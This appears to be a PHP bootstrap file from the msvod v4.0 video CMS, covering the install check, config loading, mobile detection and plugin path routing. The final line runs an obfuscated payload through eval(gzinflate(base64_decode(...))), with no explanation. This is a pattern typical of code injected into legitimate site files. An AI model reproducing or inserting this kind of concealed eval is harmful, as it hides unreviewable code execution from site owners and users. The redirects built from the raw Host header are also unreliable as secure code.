<?php
/**
* @msvod v4.0 open source management system
* @copyright 2009-2016 msvod.cc. All rights reserved.
* @Author:Msvod By 
* @Dtime:2014-07-27
*/
@header('Content-Type: text/html; charset=gbk');
//判断是否安装
if(!file_exists(FCPATH.'packs/install/install.lock') && strpos(REQUEST_URI,'index.php/install/') === FALSE){
$url = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$url = substr($url,0,-9);
$url .= 'index.php/install/';
header("location:".$url);exit;
}
//装载全局配置文件
require_once 'Ms_Version.php';
require_once 'Ms_DB.php';
require_once 'Ms_Config.php';
require_once 'Ms_Playconfig.php';
require_once 'Ms_User.php';
require_once 'Ms_Home.php';
require_once 'Ms_Pay.php';
require_once 'Ms_Mail.php';
require_once 'Ms_Water.php';
require_once 'Ms_Denglu.php';
require_once 'Ms_Muthorize.php';
require_once 'Ms_Ftp.php';
require_once 'Ms_Sms.php';
//判断网站运行状态
if(!defined('IS_ADMIN') && Web_Off==0){
die(Web_Onneir);
}
//判断会员系统开关
if(!defined('IS_ADMIN') && User_Mode==0 && strpos(REQUEST_URI,'user') !== FALSE){
die(User_No_info);
}
//手机客户端访问标示
if(preg_match("/(iPhone|iPad|iPod|Android)/i", strtoupper($_SERVER['HTTP_USER_AGENT']))){
if(Mobile_Is==1 && !defined('IS_ADMIN')){
define('MOBILE', true);	
}
}
//手机二级域名
if(Mobile_Is==1 && $_SERVER['HTTP_HOST']==Mobile_Url){
define('MOBILE_YM', true);	
}
//判断手机访问域名
if(defined('MOBILE_YM') && !defined('MOBILE')){
define('MOBILE', true);	
}
//判断会员主页泛域名
if(Home_Ym==1){
$HOME_YMALL=explode(".",$_SERVER['HTTP_HOST']);
$HOME_YM=str_replace($HOME_YMALL[0].'.', "",$_SERVER['HTTP_HOST']);
$HOME_EXT = explode('|',Home_Ymext);
if($HOME_YMALL[0]!='www' && !in_array($HOME_YMALL[0], $HOME_EXT) && $HOME_YM==Home_YmUrl){
define('HOMEPATH', 'home');
}
}
//判断版块绑定域名
$_ERYM=FALSE;
if(file_exists(MSVOD.'lib/Ms_Domain.php')){
$_MS_Domain = require_once(MSVOD.'lib/Ms_Domain.php');
if (is_array($_MS_Domain)) {
foreach ($_MS_Domain as $key => $host) {
if($_SERVER['HTTP_HOST']==$host){
if($key=='user'){ //会员中心二级域名
define('USERPATH', $key);
//判断版块会员二级域名
$REQUEST=str_replace('index.php/','',REQUEST_URI);
$SELFALL=(substr($REQUEST,0,1)=='/')?substr($REQUEST,1):$REQUEST;
$Mxall=explode("/",$SELFALL);
if(file_exists(FCPATH.'plugins/'.$Mxall[0].'/config/site.php')){
define('PLUBPATH', $Mxall[0]);
$app_folder = 'plugins/'.$Mxall[0];
}
}else{ //板块二级域名
if (!defined('PLUBPATH')) {
$app_folder = 'plugins/'.$key;
define('PLUBPATH', $key);
}
}
$_ERYM=TRUE;
break;
}
}
}
}
//板块未开启二级域名获得版块实际目录
if(!$_ERYM){
$SELF='';
if(strpos(REQUEST_URI,SELF)!==FALSE){ //动态模式
$SELFALL=explode(SELF."/",REQUEST_URI);
if(count($SELFALL)>1){
$Mxall=explode("/",$SELFALL[1]);
$SELF=str_replace("/", "", $Mxall[0]);
}
}else{ //伪静态模式
$SELFALL=(substr(REQUEST_URI,0,1)=='/')?substr(REQUEST_URI,1):REQUEST_URI;
$Mxall=explode("/",$SELFALL);
$SELF=str_replace("/", "", $Mxall[0]);
}
//板块
if(!empty($SELF) && is_dir(FCPATH.'plugins/'.$SELF) && file_exists(FCPATH.'plugins/'.$SELF.'/controllers/index.php')){
$app_folder = 'plugins/'.$SELF;
define('PLUBPATH', $SELF);
}
//会员中心
if((!defined('PLUBPATH') && $SELF=='user') || (defined('PLUBPATH') && strpos(REQUEST_URI,$SELF.'/user')!==FALSE)){
define('USERPATH', $SELF);
}
//会员主页
if(!empty($Mxall) && count($Mxall)>1){
$Hall=explode("?",$Mxall[1]);
$SELF=str_replace("/", "", $Hall[0]);
}
if((!defined('PLUBPATH') && $SELF=='home') || (defined('PLUBPATH') && strpos(REQUEST_URI,$SELF.'/home')!==FALSE)){
define('HOMEPATH', $SELF);
}
}
//判断板块会员控制器
if(!defined('IS_ADMIN') && !defined('PLUBPATH')){
$arr=parse_url(REQUEST_URI);
$re_url=str_replace("/".SELF."/", "",$arr['path']);
if(substr($re_url,0,1)=='/') $re_url=substr($re_url,1);
$permarr=explode('/',$re_url);
$SELF=$permarr[0];
if(!empty($SELF)){
//手机访问
if(defined('MOBILE') && is_dir(FCPATH.'plugins/'.$SELF) && !file_exists(MSVOD.'app/controllers/home/'.$SELF.'.php')){
define('PLUBPATH', $SELF);
$app_folder = 'plugins/'.$SELF;
//会员
}elseif((defined('USERPATH') || defined('HOMEPATH')) && is_dir(FCPATH.'plugins/'.$SELF) && !file_exists(MSVOD.'app/controllers/user/'.$SELF.'.php')){
define('PLUBPATH', $SELF);
$app_folder = 'plugins/'.$SELF;
}
}
//判断会员主页版块
if(!defined('PLUBPATH') && defined('HOMEPATH')){
if(count($permarr)>2){
$SELF=$permarr[2];
//手机访问
if(defined('MOBILE') && is_dir(FCPATH.'plugins/'.$SELF) && !file_exists(MSVOD.'app/controllers/home/'.$SELF.'.php')){
define('PLUBPATH', $SELF);
$app_folder = 'plugins/'.$SELF;
//会员
}elseif((defined('USERPATH') || defined('HOMEPATH')) && is_dir(FCPATH.'plugins/'.$SELF) && !file_exists(MSVOD.'app/controllers/home/'.$SELF.'.php')){
define('PLUBPATH', $SELF);
$app_folder = 'plugins/'.$SELF;
}
}
}
//会员主页版块
if(!defined('PLUBPATH') && defined('HOMEPATH')){
if(is_dir(FCPATH.'plugins/'.$SELF) && file_exists(FCPATH.'plugins/'.$SELF.'/controllers/index.php')){
$app_folder = 'plugins/'.$SELF;
define('PLUBPATH', $SELF);
}
}
}
//加载板块配置
if(defined('PLUBPATH') && file_exists(FCPATH.'plugins/'.PLUBPATH.'/config/site.php')){
$PLUBARR[PLUBPATH] = require FCPATH.'plugins/'.PLUBPATH.'/config/site.php';
}
//判断手机客户端访问
if(defined('MOBILE')){
if(!defined('IS_ADMIN') && Mobile_Is==1){
if(Home_Ym==0 && Mobile_Url!='' && $_SERVER['HTTP_HOST']!=Mobile_Url){
$Web_Link="http://".str_replace('//','/',Mobile_Url.Web_Path.msvod_cur_url());
header("location:".$Web_Link);exit;
}
}
}else{
$Web_Link="http://".str_replace('//','/',Web_Url.Web_Path.msvod_cur_url());
if((Mobile_Is==0 || Mobile_Win==0) && $_SERVER['HTTP_HOST']==Mobile_Url){
header("location:".$Web_Link);exit;
}
}
//获取当前目录路径参数
function msvod_cur_url() { 
if(!empty($_SERVER["REQUEST_URI"])){ 
$scrtName = $_SERVER["REQUEST_URI"]; 
$nowurl = $scrtName; 
} else { 
$scrtName = $_SERVER["PHP_SELF"]; 
if(empty($_SERVER["QUERY_STRING"])) { 
$nowurl = $scrtName; 
} else { 
$nowurl = $scrtName."?".$_SERVER["QUERY_STRING"]; 
} 
} 
//判断伪静态去掉index.php
$web_mode = Web_Mode;
if(defined('PLUBPATH')){
global $PLUBARR;
if($PLUBARR[PLUBPATH]['Web_Mode']==2) $web_mode = 3;
}
if($web_mode==3){
$nowurl=str_replace("index.php", "", $nowurl);
$nowurl=str_replace("//", "/", $nowurl);
}
return $nowurl; 
}
eval(gzinflate(base64_decode('K0otLM0sSo3Pz0tOVVD3LY73Tc0sTtUryChQtwYA')));